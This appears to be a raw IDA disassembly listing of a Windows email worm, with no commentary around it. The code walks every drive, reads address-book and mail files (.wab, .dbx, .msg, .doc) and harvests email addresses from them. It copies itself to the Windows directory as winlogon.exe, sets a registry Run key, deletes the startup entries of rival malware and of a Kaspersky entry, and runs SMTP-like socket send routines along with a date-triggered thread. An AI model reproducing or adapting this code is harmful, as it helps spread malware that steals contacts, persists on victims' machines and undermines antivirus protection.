		lea	eax, [ebp+s]
		push	eax
		lea	eax, [ebp+buf]
		push	eax
		call	sub_401938
		add	esp, 30h
		cmp	eax, ebx
		jl	short loc_4020FB
		cmp	eax, 190h
		jg	short loc_4020FB
		lea	eax, [ebp+buf]
		push	offset aQuit	; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+buf]
		pop	ecx
		push	0		; flags
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; len
		lea	eax, [ebp+buf]
		push	eax		; buf
		push	[ebp+s]		; s
		call	esi ; send

loc_4020FB:				; CODE XREF: sub_4019FF+16Bj
					; sub_4019FF+176j ...
		push	2		; how
		push	[ebp+s]		; s
		call	ds:shutdown
		push	1
		pop	esi

loc_402109:				; CODE XREF: sub_4019FF+123j
		push	[ebp+s]		; s
		call	ds:closesocket
		mov	eax, esi
		jmp	short loc_402118
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402116:				; CODE XREF: sub_4019FF+4Ej
					; sub_4019FF+65j ...
		xor	eax, eax

loc_402118:				; CODE XREF: sub_4019FF+715j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_4019FF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40211F	proc near		; CODE XREF: sub_4023E2+18Ap
					; sub_4023E2+1A5p

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		xor	ecx, ecx

loc_402125:				; CODE XREF: sub_40211F+1Cj
		mov	al, [ecx+edx]
		test	al, al
		jz	short loc_402130
		cmp	al, 0Ah
		jnz	short loc_402134

loc_402130:				; CODE XREF: sub_40211F+Bj
		mov	byte ptr [ecx+edx], 20h

loc_402134:				; CODE XREF: sub_40211F+Fj
		inc	ecx
		cmp	ecx, 1000h
		jl	short loc_402125
		and	byte ptr [edx+1000h], 0
		retn
sub_40211F	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402145	proc near		; CODE XREF: sub_4023E2+1B1p

var_1000	= byte ptr -1000h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 1000h
		call	__alloca_probe
		push	esi
		lea	eax, [ebp+var_1000]
		push	offset word_414BFC ; char *
		push	eax		; char *
		call	_strcpy
		mov	esi, [ebp+arg_0]
		pop	ecx
		pop	ecx
		xor	ecx, ecx
		xor	eax, eax

loc_40216D:				; CODE XREF: sub_402145+51j
		mov	dl, [eax+esi]
		test	eax, eax
		jle	short loc_402188
		cmp	dl, 20h
		jnz	short loc_402188
		cmp	[eax+esi-1], dl
		jnz	short loc_402190
		mov	[ebp+ecx+var_1000], dl
		jmp	short loc_40218F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402188:				; CODE XREF: sub_402145+2Dj
					; sub_402145+32j
		mov	[ebp+ecx+var_1000], dl

loc_40218F:				; CODE XREF: sub_402145+41j
		inc	ecx

loc_402190:				; CODE XREF: sub_402145+38j
		inc	eax
		cmp	eax, 0FFFh
		jl	short loc_40216D
		and	[ebp+ecx+var_1000], 0
		lea	eax, [ebp+var_1000]
		push	eax		; char *
		push	esi		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		pop	esi
		leave
		retn
sub_402145	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4021B2	proc near		; CODE XREF: sub_402235+15Bp

arg_0		= dword	ptr  8

		push	ebx
		mov	ebx, [esp+arg_0]
		push	esi
		push	edi
		mov	esi, offset off_407114

loc_4021BE:				; CODE XREF: sub_4021B2+23j
		push	dword ptr [esi]	; char *
		push	ebx		; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_402231
		add	esi, 4
		cmp	esi, offset dword_407154
		jl	short loc_4021BE
		mov	eax, ds:dword_414BF8
		cmp	eax, 27FFh
		jg	short loc_402231
		xor	esi, esi
		test	eax, eax
		jle	short loc_402208
		mov	edi, offset dword_40AAF0

loc_4021EE:				; CODE XREF: sub_4021B2+54j
		push	ebx		; char *
		push	dword ptr [edi]	; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_402231
		inc	esi
		add	edi, 4
		cmp	esi, ds:dword_414BF8
		jl	short loc_4021EE

loc_402208:				; CODE XREF: sub_4021B2+35j
		push	ebx		; char *
		call	_strlen
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, ds:dword_414BF8
		push	ebx		; char *
		push	eax		; char *
		mov	ds:dword_40AAF0[ecx*4],	eax
		call	_strcpy
		add	esp, 10h
		inc	ds:dword_414BF8

loc_402231:				; CODE XREF: sub_4021B2+18j
					; sub_4021B2+2Fj ...
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4021B2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402235	proc near		; CODE XREF: sub_4023E2+17Bp
					; sub_4023E2+196p ...

var_38		= byte ptr -38h
var_37		= byte ptr -37h
var_36		= byte ptr -36h
var_34		= byte ptr -34h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		push	edi		; char *
		call	_strlen
		xor	ebx, ebx
		xor	esi, esi
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+var_C], eax
		mov	[ebp+var_8], ebx
		jz	loc_4023AA
		and	[ebp+var_1], 0

loc_40225E:				; CODE XREF: sub_402235:loc_4023A4j
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_C]
		jge	loc_4023AA
		cmp	ds:byte_406170[esi], 0
		jz	short loc_40228F
		mov	ecx, ds:off_4070AC[esi*4]
		mov	dl, [eax+edi]
		cmp	dl, [ecx]
		jnz	short loc_402285
		inc	ebx
		inc	esi
		jmp	short loc_402289
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402285:				; CODE XREF: sub_402235+4Aj
		xor	esi, esi
		xor	ebx, ebx

loc_402289:				; CODE XREF: sub_402235+4Ej
		inc	eax
		mov	[ebp+var_8], eax
		jmp	short loc_4022DA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40228F:				; CODE XREF: sub_402235+3Cj
		movsx	eax, byte ptr [eax+edi]
		push	eax		; int
		push	ds:off_4070AC[esi*4] ; char *
		call	_strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_4022D2
		mov	eax, [ebp+var_8]
		mov	al, [eax+edi]
		cmp	al, 60h
		jle	short loc_4022B4
		cmp	al, 7Bh
		jl	short loc_4022D2

loc_4022B4:				; CODE XREF: sub_402235+79j
		cmp	al, 2Fh
		jle	short loc_4022BC
		cmp	al, 3Ah
		jl	short loc_4022D2

loc_4022BC:				; CODE XREF: sub_402235+81j
		cmp	[ebp+var_1], 1
		jnz	short loc_4022C5
		inc	esi
		jmp	short loc_4022CC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4022C5:				; CODE XREF: sub_402235+8Bj
		inc	[ebp+var_8]
		xor	esi, esi
		xor	ebx, ebx

loc_4022CC:				; CODE XREF: sub_402235+8Ej
		and	[ebp+var_1], 0
		jmp	short loc_4022DA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4022D2:				; CODE XREF: sub_402235+6Fj
					; sub_402235+7Dj ...
		inc	[ebp+var_8]
		mov	[ebp+var_1], 1
		inc	ebx

loc_4022DA:				; CODE XREF: sub_402235+58j
					; sub_402235+9Bj
		cmp	ebx, 28h
		jle	short loc_4022E7
		and	[ebp+var_1], 0
		xor	esi, esi
		xor	ebx, ebx

loc_4022E7:				; CODE XREF: sub_402235+A8j
		cmp	esi, 3
		jnz	loc_4023A4
		mov	ax, ds:word_414BFC
		push	9
		mov	word ptr [ebp+var_34], ax
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp-32h]
		rep stosd
		stosw
		mov	eax, [ebp+var_8]
		push	ebx		; size_t
		sub	eax, ebx
		add	eax, [ebp+arg_0]
		push	eax		; char *
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strncpy
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strlen
		add	esp, 10h
		cmp	eax, 5
		jbe	short loc_402396
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strlen
		mov	esi, eax
		pop	ecx
		cmp	byte ptr [ebp+esi-35h],	5Dh
		lea	edi, [ebp+esi-35h]
		jnz	short loc_402356
		push	5Bh		; int
		push	ds:off_4070B8	; char *
		call	_strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_402356
		and	[edi], al

loc_402356:				; CODE XREF: sub_402235+10Aj
					; sub_402235+11Dj
		movsx	eax, byte ptr [edi]
		push	eax		; int
		call	_isdigit
		test	eax, eax
		pop	ecx
		jz	short loc_402372
		cmp	[ebp+esi+var_37], 2Eh
		jz	short loc_40238C
		cmp	[ebp+esi+var_38], 2Eh
		jz	short loc_40238C

loc_402372:				; CODE XREF: sub_402235+12Dj
		cmp	[ebp+esi+var_36], 2Eh
		jz	short loc_40238C
		cmp	byte ptr [edi],	5Dh
		jz	short loc_40238C
		cmp	[ebp+esi+var_37], 2Eh
		jz	short loc_40238C
		cmp	[ebp+esi+var_38], 2Eh
		jnz	short loc_402396

loc_40238C:				; CODE XREF: sub_402235+134j
					; sub_402235+13Bj ...
		lea	eax, [ebp+var_34]
		push	eax
		call	sub_4021B2
		pop	ecx

loc_402396:				; CODE XREF: sub_402235+F3j
					; sub_402235+155j
		and	[ebp+var_1], 0
		mov	edi, [ebp+arg_0]
		xor	esi, esi
		xor	ebx, ebx
		cmp	esi, 3

loc_4023A4:				; CODE XREF: sub_402235+B5j
		jl	loc_40225E

loc_4023AA:				; CODE XREF: sub_402235+1Fj
					; sub_402235+2Fj
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		leave
		retn
sub_402235	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4023B1	proc near		; CODE XREF: sub_4023E2+13p

arg_0		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, [esp+arg_0]
		push	edi		; char *
		call	_strlen
		pop	ecx
		mov	esi, eax

loc_4023C0:				; CODE XREF: sub_4023B1+19j
					; sub_4023B1+25j
		dec	esi
		cmp	esi, 0FFFFFFFFh
		jle	short loc_4023DD
		cmp	byte ptr [esi+edi], 2Eh
		jnz	short loc_4023C0
		push	edi		; char *
		call	_strlen
		dec	eax
		pop	ecx
		cmp	esi, eax
		jz	short loc_4023C0
		lea	eax, [esi+edi]
		jmp	short loc_4023DF
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4023DD:				; CODE XREF: sub_4023B1+13j
		xor	eax, eax

loc_4023DF:				; CODE XREF: sub_4023B1+2Aj
		pop	edi
		pop	esi
		retn
sub_4023B1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4023E2	proc near		; CODE XREF: sub_4025E9:loc_4026D5p

sz		= byte ptr -100Ch
lOffset		= dword	ptr -8
var_4		= dword	ptr -4
hFile		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 100Ch
		call	__alloca_probe
		push	ebx
		push	esi
		push	edi
		push	[ebp+hFile]
		call	sub_4023B1
		mov	ebx, eax
		xor	esi, esi
		cmp	ebx, esi
		pop	ecx
		mov	[ebp+var_4], ebx
		jz	loc_4025E4
		push	ebx		; char *
		call	_strlen
		pop	ecx
		push	eax		; cchLength
		push	ebx		; lpsz
		call	ds:CharLowerBuffA
		mov	[ebp+lOffset], esi
		mov	edi, 0FFh

loc_402421:				; CODE XREF: sub_4023E2+58j
		push	ebx		; char *
		push	ds:off_4070B8[esi*4] ; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402436
		mov	esi, edi

loc_402436:				; CODE XREF: sub_4023E2+50j
		inc	esi
		cmp	esi, 15h
		jl	short loc_402421
		cmp	esi, edi
		jl	loc_4025E4
		push	0		; iReadWrite
		push	[ebp+hFile]	; lpPathName
		call	ds:_lopen
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFile], eax
		jz	loc_4025E4
		mov	ebx, offset word_414BFC
		lea	eax, [ebp+sz]
		push	ebx		; char *
		push	eax		; char *
		call	_strcpy
		mov	esi, ds:_lread
		pop	ecx
		pop	ecx
		mov	edi, 1000h
		lea	eax, [ebp+sz]
		push	edi		; uBytes
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile

loc_402485:				; CODE XREF: sub_4023E2+1F4j
		call	esi ; _lread
		and	[ebp+eax+sz], 0
		test	eax, eax
		jle	loc_4025DB
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; cchLength
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerBuffA
		push	offset a_sht	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402580
		push	offset a_tbb	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402580
		push	offset a_adb	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402580
		push	offset a_wab	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402580
		push	offset a_msg	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402565
		push	offset a_oft	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402565
		push	offset a_doc	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402565
		push	offset a_dbx	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402565
		lea	eax, [ebp+sz]
		push	eax
		call	sub_402235

loc_402562:				; CODE XREF: sub_4023E2+19Cj
		pop	ecx
		jmp	short loc_4025A7
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402565:				; CODE XREF: sub_4023E2+139j
					; sub_4023E2+14Cj ...
		lea	eax, [ebp+sz]
		push	eax
		call	sub_40211F
		lea	eax, [ebp+sz]
		push	eax
		call	sub_402235
		pop	ecx
		jmp	short loc_402562
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402580:				; CODE XREF: sub_4023E2+E1j
					; sub_4023E2+F8j ...
		lea	eax, [ebp+sz]
		push	eax
		call	sub_40211F
		lea	eax, [ebp+sz]
		push	eax
		call	sub_402145
		lea	eax, [ebp+sz]
		push	eax
		call	sub_402235
		add	esp, 0Ch

loc_4025A7:				; CODE XREF: sub_4023E2+181j
		push	0		; iOrigin
		push	[ebp+lOffset]	; lOffset
		push	[ebp+hFile]	; hFile
		call	ds:_llseek
		add	[ebp+lOffset], 800h
		lea	eax, [ebp+sz]
		push	ebx		; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+sz]
		pop	ecx
		push	edi
		push	eax
		push	[ebp+hFile]
		jmp	loc_402485
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4025DB:				; CODE XREF: sub_4023E2+AFj
		push	[ebp+hFile]	; hFile
		call	ds:_lclose

loc_4025E4:				; CODE XREF: sub_4023E2+22j
					; sub_4023E2+5Cj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4023E2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4025E9	proc near		; CODE XREF: sub_4025E9+E5p
					; StartAddress+24p

sz		= byte ptr -540h
FindFileData	= byte ptr -140h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 540h
		push	esi
		lea	eax, [ebp+sz]
		push	[ebp+arg_0]	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+sz]
		push	offset a__0	; char *
		push	eax		; char *
		call	_strcat
		add	esp, 10h
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		lea	eax, [ebp+sz]
		push	eax		; lpFileName
		call	ds:FindFirstFileA
		mov	esi, eax
		test	esi, esi
		jz	loc_402704
		cmp	esi, 0FFFFFFFFh
		jz	loc_402704

loc_40263D:				; CODE XREF: sub_4025E9+10Ej
		cmp	byte ptr [ebp-113h], 0
		jnz	short loc_402653
		cmp	byte ptr [ebp-114h], 2Eh
		jz	loc_4026E7

loc_402653:				; CODE XREF: sub_4025E9+5Bj
		cmp	byte ptr [ebp-112h], 0
		jnz	short loc_40266E
		cmp	byte ptr [ebp-114h], 2Eh
		jnz	short loc_40266E
		cmp	byte ptr [ebp-113h], 2Eh
		jz	short loc_4026E7

loc_40266E:				; CODE XREF: sub_4025E9+71j
					; sub_4025E9+7Aj
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+sz]
		push	offset asc_407CBC ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp-114h]
		push	eax		; char *
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strlen
		add	esp, 1Ch
		push	eax		; cchLength
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerBuffA
		test	[ebp+FindFileData], 10h
		lea	eax, [ebp+sz]
		push	eax
		jz	short loc_4026D5
		call	sub_4025E9
		jmp	short loc_4026DA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4026D5:				; CODE XREF: sub_4025E9+E3j
		call	sub_4023E2

loc_4026DA:				; CODE XREF: sub_4025E9+EAj
		cmp	ds:dword_414BF8, 27FFh
		pop	ecx
		jg	short loc_4026FD

loc_4026E7:				; CODE XREF: sub_4025E9+64j
					; sub_4025E9+83j
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		push	esi		; hFindFile
		call	ds:FindNextFileA
		test	eax, eax
		jnz	loc_40263D

loc_4026FD:				; CODE XREF: sub_4025E9+FCj
		push	esi		; hFindFile
		call	ds:FindClose

loc_402704:				; CODE XREF: sub_4025E9+45j
					; sub_4025E9+4Ej
		pop	esi
		leave
		retn
sub_4025E9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: WinMain(x,x,x,x)+AAo
		push	esi
		push	0FFFFFFFFh	; nPriority
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:SetThreadPriority
		mov	esi, offset off_40723C

loc_40271C:				; CODE XREF: StartAddress+33j
		push	dword ptr [esi]	; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 5
		jz	short loc_402731
		push	dword ptr [esi]
		call	sub_4025E9
		pop	ecx

loc_402731:				; CODE XREF: StartAddress+20j
		add	esi, 4
		cmp	esi, offset dword_40729C
		jl	short loc_40271C
		xor	eax, eax
		pop	esi
		retn	4
StartAddress	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402742	proc near		; CODE XREF: sub_402770+E2p
					; sub_402770+EFp ...

hKey		= dword	ptr  8
phkResult	= dword	ptr  0Ch
lpValueName	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		lea	eax, [ebp+phkResult]
		push	eax		; phkResult
		push	[ebp+phkResult]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jnz	short loc_40276E
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegDeleteValueA
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey

loc_40276E:				; CODE XREF: sub_402742+15j
		pop	ebp
		retn
sub_402742	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402770	proc near		; CODE XREF: WinMain(x,x,x,x)+64p

ExistingFileName= byte ptr -824h
var_425		= byte ptr -425h
Data		= byte ptr -424h
hKey		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 824h
		push	ebx
		push	esi
		mov	esi, 400h
		push	edi
		lea	eax, [ebp+ExistingFileName]
		push	esi		; nSize
		xor	ebx, ebx
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+Data]
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		lea	eax, [ebp+Data]
		push	eax		; char *
		call	_strlen
		cmp	[ebp+eax+var_425], 5Ch
		pop	ecx
		jz	short loc_4027CA
		lea	eax, [ebp+Data]
		push	offset asc_407CBC ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_4027CA:				; CODE XREF: sub_402770+45j
		lea	eax, [ebp+Data]
		push	offset aWinlogon_exe ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+Data]
		pop	ecx
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+Data]
		push	offset aStealth	; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+hKey]
		pop	ecx
		mov	esi, offset SubKey ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	eax		; phkResult
		mov	edi, 80000002h
		push	esi		; lpSubKey
		push	edi		; hKey
		call	ds:RegOpenKeyA
		lea	eax, [ebp+Data]
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; cbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	1		; dwType
		push	ebx		; Reserved
		push	offset ValueName ; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		mov	ebx, offset aTaskmon ; "Taskmon"
		push	ebx
		push	esi
		push	edi
		call	sub_402742
		push	ebx
		mov	ebx, 80000001h
		push	esi
		push	ebx
		call	sub_402742
		push	offset aExplorer ; "Explorer"
		push	esi
		push	edi
		call	sub_402742
		push	offset aExplorer ; "Explorer"
		push	esi
		push	ebx
		call	sub_402742
		add	esp, 30h
		push	offset aClsidE6fb5e20D ; lpSubKey
		push	80000000h	; hKey
		call	ds:RegDeleteKeyA
		push	offset aKasperskyav ; "KasperskyAv"
		push	esi
		push	edi
		call	sub_402742
		push	offset aKasperskyav ; "KasperskyAv"
		push	esi
		push	ebx
		call	sub_402742
		push	offset aSystem_	; "system."
		push	esi
		push	edi
		call	sub_402742
		push	offset aSystem_	; "system."
		push	offset aSoftwareMicr_0 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	edi
		call	sub_402742
		push	offset aMsgsvr32 ; "msgsvr32"
		push	esi
		push	edi
		call	sub_402742
		push	offset aDeleteMe ; "DELETE ME"
		push	esi
		push	edi
		call	sub_402742
		add	esp, 48h
		push	offset aD3dupdate_exe ;	"d3dupdate.exe"
		push	esi
		push	ebx
		call	sub_402742
		push	offset aAu_exe	; "au.exe"
		push	esi
		push	ebx
		call	sub_402742
		push	offset aService	; "service"
		push	esi
		push	edi
		call	sub_402742
		push	offset aOle	; "OLE"
		push	esi
		push	ebx
		call	sub_402742
		push	offset aSentry	; "Sentry"
		push	esi
		push	edi
		call	sub_402742
		add	esp, 3Ch
		push	offset aSoftwareMicr_1 ; lpSubKey
		push	ebx		; hKey
		call	ds:RegDeleteKeyA
		push	offset aSystemCurrentc ; lpSubKey
		push	edi		; hKey
		call	ds:RegDeleteKeyA
		push	offset aWindowsService ; "Windows Services Host"
		push	esi
		push	ebx
		call	sub_402742
		push	offset aWindowsService ; "Windows Services Host"
		push	esi
		push	edi
		call	sub_402742
		add	esp, 18h
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_402770	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_402955(LPVOID)
sub_402955	proc near		; DATA XREF: WinMain(x,x,x,x)+BAo

SystemTime	= _SYSTEMTIME ptr -10h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	0FFFFFFFFh	; nPriority
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:SetThreadPriority

loc_40296A:				; CODE XREF: sub_402955+72j
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		cmp	[ebp+SystemTime.wDay], 2
		jnz	short loc_4029BF
		cmp	[ebp+SystemTime.wMonth], 3
